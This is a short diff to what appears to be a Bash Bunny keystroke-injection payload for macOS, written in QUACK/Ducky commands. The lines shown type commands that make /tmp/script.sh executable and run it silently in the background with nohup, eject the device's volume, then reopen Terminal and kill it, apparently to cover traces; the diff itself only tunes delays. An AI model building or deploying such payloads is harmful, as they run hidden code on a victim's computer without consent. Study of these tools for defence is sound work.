@@ -25,11 +25,12 @@ QUACK STRING "diskutil eject /Volumes/BashBunny/"
 QUACK ENTER
 QUACK STRING "chmod +x /tmp/script.sh && nohup bash /tmp/script.sh &> /dev/null &"
 QUACK ENTER
+QUACK DELAY 2000
 QUACK GUI SPACE
-QUACK DELAY 1500
+QUACK DELAY 1000
 QUACK STRING terminal
 QUACK ENTER
-QUACK DELAY 500
+QUACK DELAY 1000
 QUACK STRING "killall Terminal"
 QUACK ENTER
 
